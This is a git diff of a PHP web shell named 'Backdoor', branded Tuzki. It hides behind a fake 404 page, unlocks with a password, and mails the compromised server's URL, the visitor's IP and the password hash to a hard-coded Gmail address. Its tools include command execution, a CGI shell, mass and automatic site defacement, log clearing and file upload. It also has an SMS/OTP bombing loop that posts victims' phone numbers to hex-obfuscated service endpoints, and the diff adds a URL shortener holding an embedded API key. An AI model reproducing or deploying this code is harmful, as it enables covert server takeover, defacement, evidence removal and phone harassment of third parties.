@@ -26,6 +26,9 @@ ini_set('max_execution_time', 0);
 ini_set('memory_limit', '999999999M');
 ini_restore('safe_mode');
 
+$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
+$email = "gedzsarjuncomuniti@gmail.com"; // Your Email
+
 if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
 		$sep = substr('\\', 0, 1);
 		$os = "Windows";
@@ -34,7 +37,6 @@ if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
 		$os = "Linux";
 }
 
-$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
 if (! empty($_SERVER['HTTP_USER_AGENT'])) {
 	$userAgents = array(
 		"Googlebot",
@@ -72,28 +74,20 @@ if (! empty($_SERVER['HTTP_USER_AGENT'])) {
 function login_shell()
 {
 	?>
-<title>403 Forbidden</title>
-<head>
-<h1>Forbidden</h1>
-<p>You don't have permission to access <?php
-	echo $_SERVER['PHP_SELF'];
-	?>
- on this server.</p>
-<p>Additionally, a 403 Forbidden error was encountered while trying to
-	use an ErrorDocument to handle the request.</p>
-</head>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL <?php echo $_SERVER['PHP_SELF'];?> was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>
 <?php
 	exit();
 }
 if (! isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
 	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
 		$_SESSION[md5(sha1($_SERVER['HTTP_HOST']))] = true;
-		$email = "gedzsarjuncomuniti@gmail.com"; // Your Email
-		$shell_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-		$subject = "Logs";
-		$from = "From:Cvar1984";
-		$content_mail = "URL : $shell_path\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : $auth_pass\n\nBy Cvar1984";
-		@mail($email, $subject, $content_mail, $from);
+		$shell_path = 
+		$content_mail = "URL : http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\n\nIP : ".$_SERVER['REMOTE_ADDR']."\n\nPassword : ".$auth_pass."\n\nBy Cvar1984";
+		@mail($email, "Logs", $content_mail, "From:Cvar1984");
 	} else {
 		login_shell();
 	}
@@ -102,101 +96,91 @@ if (! isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
 <!DOCTYPE html>
 <html>
 <head>
-<title>Backdoor</title>
-<!-- CSS STYLE-->
-<meta charset="utf-8" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<link rel="shortcut icon"
-	href="https://www.hackthebox.eu/images/favicon.png" />
-<link
-	href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
-	rel="stylesheet" />
-<script
-	src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"
-	type="text/javascript"></script>
-<script
-	src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"
-	type="text/javascript"></script>
-<style type='text/css'>
-body {
-	background: black;
-	color: lavender;
-	text-shadow: 2px 2px 4px #000000;
-	background:
-		url(http://shing.mobile9.com/download/media/538/tuzkiyouse_wk2o9pqf.jpg)
-		no-repeat center center fixed;
-	-webkit-background-size: cover;
-	-moz-background-size: cover;
-	-o-background-size: cover;
-	background-size: cover;
-}
+	<title>Backdoor</title>
+	<!-- CSS STYLE-->
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<link rel="shortcut icon" href="https://www.hackthebox.eu/images/favicon.png" />
+	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
+	<style type='text/css'>
+	body {
+		background: black;
+		color: lavender;
+		text-shadow: 2px 2px 4px #000000;
+		background: url(http://shing.mobile9.com/download/media/538/tuzkiyouse_wk2o9pqf.jpg) no-repeat center center fixed;
+		-webkit-background-size: cover;
+		-moz-background-size: cover;
+		-o-background-size: cover;
+		background-size: cover;
+	}
 
-@font-face {
-	font-family: 'Orbitron';
-	font-style: normal;
-	font-weight: 700;
-	src: local('Orbitron Bold'), local('Orbitron-Bold'),
-		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2)
-		format('woff2');
-	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+	@font-face {
+		font-family: 'Orbitron';
+		font-style: normal;
+		font-weight: 700;
+		src: local('Orbitron Bold'), local('Orbitron-Bold'),
+		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
+		unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
 		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
 		U+2212, U+2215, U+FEFF, U+FFFD;
-}
+	}
 
-li {
-	display: inline;
-	text-shadow: 2px 2px 4px #000000;
-	font-size: 17px;
-}
+	li {
+		display: inline;
+		text-shadow: 2px 2px 4px #000000;
+		font-size: 17px;
+	}
 
-a {
-	color: lime;
-}
+	a {
+		color: lime;
+	}
 
-a:hover {
-	color: red;
-}
+	a:hover {
+		color: red;
+	}
 
-table, tr, td {
-	border: 1px
-}
+	table,
+	tr,
+	td {
+		border: 1px
+	}
 
-.table-hover {
-	border: 1px solid green;
-	cellpadding: 3;
-	cellspacing: 3;
-	font-size: 15px;
-}
+	.table-hover {
+		border: 1px solid green;
+		cellpadding: 3;
+		cellspacing: 3;
+		font-size: 15px;
+	}
 
-#textarea {
-	background: transparent;
-	width: 1066px;
-	height: 500px;
-	font-family: Arial, Helvetica, monospace;
-	color: lavender;
-}
+	#textarea {
+		background: transparent;
+		width: 1066px;
+		height: 500px;
+		font-family: Arial, Helvetica, monospace;
+		color: lavender;
+	}
 
-#input {
-	background: transparent;
-	width: 250px;
-	font-family: Arial, Helvetica, monospace;
-	color: lavender;
-}
+	#input {
+		background: transparent;
+		width: 250px;
+		font-family: Arial, Helvetica, monospace;
+		color: lavender;
+	}
 
-#menu {
-	
-}
+	#menu {}
 
-* {
-	font-family: 'Orbitron';
-}
+	* {
+		font-family: 'Orbitron';
+	}
 
-.icon {
-	width: 20px;
-	height: 20px;
-}
-</style>
+	.icon {
+		width: 20px;
+		height: 20px;
+	}
+	</style>
 </head>
 <body>
 <?php
@@ -213,6 +197,16 @@ function post_data($url, $data)
 	curl_close($ch);
 }
 
+function get_data($url, $data)
+{
+	$ch = curl_init($url."?$data");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	return curl_exec($ch);
+	curl_close($ch);
+}
+
 function home()
 {
 	echo "<script>window.location='?';</script>";
@@ -222,7 +216,7 @@ function spamsms()
 {
 	?>
 <center>
-		<h2>Spam SMS</h2>
+		<h2>Multi Spam SMS</h2>
 		<form method="post">
 			<textarea name="no" class="form-control" id="textarea"
 				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
@@ -235,13 +229,13 @@ function spamsms()
 		$no = str_replace(' ', '', $no);
 		$no = str_replace("\n\n", "\n", $no);
 		foreach ($no as $on) :
-			echo "<hr>Calling     -> " . $on . "<hr><br>";
+			echo "<hr>Calling	 -> " . $on . "<hr>";
 			post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
 		endforeach
 		;
 		for ($x = 0; $x < 100; $x ++) {
 			foreach ($no as $on) :
-				echo "<hr>Send OTP To -> " . $on . "<hr><br>";
+				echo "<hr>Send OTP To -> " . $on . "<hr>";
 				post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
 				post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
 			endforeach
@@ -305,22 +299,23 @@ function alert($message)
 <script type="text/javascript">
 var ALERT_TITLE = "Alert";
 var ALERT_BUTTON_TEXT = "Ok";
-if(document.getElementById) {
+if (document.getElementById) {
 	window.alert = function(txt) {
 		createCustomAlert(txt);
 	}
 }
+
 function createCustomAlert(txt) {
 	d = document;
-	if(d.getElementById("modalContainer")) return;
+	if (d.getElementById("modalContainer")) return;
 	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
 	mObj.id = "modalContainer";
 	mObj.style.height = d.documentElement.scrollHeight + "px";
 	alertObj = mObj.appendChild(d.createElement("div"));
 	alertObj.id = "alertBox";
-	if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
-	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
-	alertObj.style.visiblity="visible";
+	if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
+	alertObj.style.visiblity = "visible";
 	h1 = alertObj.appendChild(d.createElement("h1"));
 	h1.appendChild(d.createTextNode(ALERT_TITLE));
 	msg = alertObj.appendChild(d.createElement("p"));
@@ -331,15 +326,15 @@ function createCustomAlert(txt) {
 	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
 	btn.href = "#";
 	btn.focus();
-	btn.onclick = function() { removeCustomAlert();return false; }
+	btn.onclick = function() { removeCustomAlert(); return false; }
 	alertObj.style.display = "block";
 }
+
 function removeCustomAlert() {
 	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
 }
 </script>
-
-	<style type="text/css">
+<style type="text/css">
 #modalContainer {
 	background-color: rgba(0, 0, 0, 0.3);
 	position: absolute;
@@ -399,7 +394,9 @@ function removeCustomAlert() {
 	text-decoration: none;
 }
 
+
 /* unrelated styles */
+
 #mContainer {
 	position: relative;
 	width: 600px;
@@ -410,7 +407,8 @@ function removeCustomAlert() {
 	font: 0.7em verdana, arial;
 }
 
-h1, h2 {
+h1,
+h2 {
 	margin: 0;
 	padding: 4px;
 	font: bold 1.5em verdana;
@@ -448,8 +446,7 @@ code {
 
 .main {
 	width: 100%;
-	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px
-		rgba(48, 48, 48, 0.7);
+	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
 }
 
 .vn-nav ul {
@@ -546,7 +543,7 @@ code {
 	text-decoration: none;
 }
 </style>
-	<script type="text/javascript">alert(<?php echo "'".$message."'";?>);</script>
+<script type="text/javascript">alert(<?php echo "'".$message."'";?>);</script>
 <?php
 }
 
@@ -764,45 +761,91 @@ function ngindex()
 		<tr>
 			<td>Sub Content</td> <td>:</td>
 			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
-	    </table>
-	    <center>
-	    	<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
-	    </center>
+		</table>
+		<center>
+			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
+		</center>
 </form>
 	<?php
 	die();
 }
 
+function short_link()
+{
+	echo "<center><h2>Shortlink Generator</h2></center>";
+	if (isset($_POST['action'])) {
+		$param="https://www.googleapis.com/urlshortener/v1/url?key=AIzaSyDKvTCsXX3Vipbqyhj3a0JH1D3JYMuB5VM";
+		$post = array(
+		"longUrl"=> $_POST['link']
+	);
+
+$jsondata = json_encode($post);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$param);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type:application/json"));
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $jsondata);
+$response=curl_exec($ch);
+curl_close($ch);
+$json=json_decode($response);
+if(isset($json->error)) {
+	echo $json->error->message;
+	} else {
+		echo "<center><textarea id='textarea' class='form-control' readonly>".$json->id."</textarea></center>";
+		}
+	}
+
+?>
+<form method='post'>
+	<table align="center">
+		<tr>
+			<td>Link</td>
+			<td>:</td>
+			<td>
+				<input type='text' class='input-sm' id='input' name='link'>
+			</td>
+		</tr>
+	</table>
+	<center>
+		<br />
+		<input type='submit' class='btn btn-danger' name='action'>
+	</center>
+</form>
+<?php
+die();
+}
+
 // END FUNCTION
 ?>
- <nav class="navbar navbar-inverse">
-		<div class="container-fluid">
-			<div class="navbar-header">
-				<a class="navbar-brand"
-					href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
-			</div>
-			<ul class="nav navbar-nav">
-				<li class="active"><a href="?">Home</a></li>
-				<li class="dropdown"><a class="dropdown-toggle"
-					data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
-					<ul class="dropdown-menu">
-						<li><a href='?do=cmd'>Command Prompt</a></li>
-						<li><a href='?do=sms'>Spam SMS</a></li>
-						<li><a href='?do=music'>Music</a></li>
-						<li><a href='?do=jumping'>Jumping</a></li>
-						<li><a href='?do=config'>Config</a></li>
-						<li><a href='?do=mass_deface'>Mass Deface</a></li>
-						<li><a href='?do=info'>Server Info</a></li>
-						<li><a href='?do=logs'>Clear Logs</a></li>
-						<li><a href='?do=cgi'>CGI Shell</a></li>
-						<li><a href='?do=deface'>Auto Deface</a></li>
-					</ul></li>
-				<li><a href='?do=logout'><span class="glyphicon glyphicon-log-in"></span>
-						Logout</a></li>
-			</ul>
+<nav class="navbar navbar-inverse">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<a class="navbar-brand" href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
 		</div>
-	</nav>
-<?php
+		<ul class="nav navbar-nav">
+			<li class="active"><a href="?">Home</a></li>
+			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
+				<ul class="dropdown-menu">
+					<li><a href='?do=cmd'>Command Prompt</a></li>
+					<li><a href='?do=sms'>Spam SMS</a></li>
+					<li><a href='?do=music'>Music</a></li>
+					<li><a href='?do=jumping'>Jumping</a></li>
+					<li><a href='?do=config'>Config</a></li>
+					<li><a href='?do=mass_deface'>Mass Deface</a></li>
+					<li><a href='?do=info'>Server Info</a></li>
+					<li><a href='?do=logs'>Clear Logs</a></li>
+					<li><a href='?do=cgi'>CGI Shell</a></li>
+					<li><a href='?do=deface'>Auto Deface</a></li>
+					<li><a href='?do=shortlink'>Shortlink Generator</a></li>
+				</ul>
+			</li>
+			<li><a href='?do=logout'><span class="glyphicon glyphicon-log-in"></span>
+						Logout</a></li>
+		</ul>
+	</div>
+</nav><?php
 if (@$_GET['do'] == 'home') {
 	home();
 } elseif (@$_GET['do'] == 'sms') {
@@ -844,6 +887,14 @@ if (@$_GET['do'] == 'home') {
 	cgi_shell();
 } elseif(@$_GET['do'] == 'deface') {
 	ngindex();
+} elseif(@$_GET['do'] == 'shortlink') {
+	short_link();
+} elseif(@$_GET['do'] == 'new' and isset($_GET['dir'])) {
+	if(@mkdir($_GET['dir'].'/'.'new_dir')) {
+		alert("Success");
+	} else {
+		alert("Permission Denied Or File Exists");
+	}	
 }
 
 $dir = scandir(getcwd());
@@ -862,23 +913,26 @@ foreach ($dir as $dir) :
 		<td><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' class='icon'>";
 		echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
-		<a href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a> |
-		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> | 
-		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
+		<a class='btn btn-success btn-xs' href='?do=new&dir=" . getcwd() . $sep . $dir . "'>New Dir</a>
+		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
+		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
+		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	} elseif ($ext == 'jpg' or $ext == 'png' or $ext == 'jpeg' or $ext == 'gif' or $ext == 'rar' or $ext == 'zip' or $ext == 'doc' or $ext == 'pdf') {
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
-		<a href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a> |
-		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> | 
-		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
+		<a class='btn btn-success btn-xs' href='?do=new&dir=" . getcwd() . $sep . dirname($dir) . "'>New Dir</a>
+		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
+		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
+		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	} else {
 		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
 		echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
-		<a href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a> |
-		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> | 
-		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
+		<a class='btn btn-success btn-xs' href='?do=new&dir=" . getcwd() . $sep . dirname($dir) . "'>New Dir</a>
+		<a class='btn btn-success btn-xs' href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a>
+		<a class='btn btn-success btn-xs' href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> 
+		<a class='btn btn-success btn-xs' href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 	?>
 	</tr>
@@ -892,8 +946,7 @@ endforeach
 		<th style='padding: 5px;' colspan='2'>
 			<center>
 			Copyright &copy <?php echo date("Y"); ?>, 
-			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a
-					href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
+			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
 			</center>
 		</th>
 	</table>
@@ -906,10 +959,10 @@ if (isset($_POST['upl'])) {
 	}
 }
 ?>
-   <form method="post" enctype="multipart/form-data">
+	<form method="post" enctype="multipart/form-data">
 		<center>
-			<input class="btn" id="input" type="file" name="file" /> <input
-				class="btn btn-danger" name="upl" type="submit" value="Save">
+			<input class="btn" id="input" type="file" name="file" />
+			<input class="btn btn-danger" name="upl" type="submit" value="Save">
 		</center>
 	</form>
 </body>
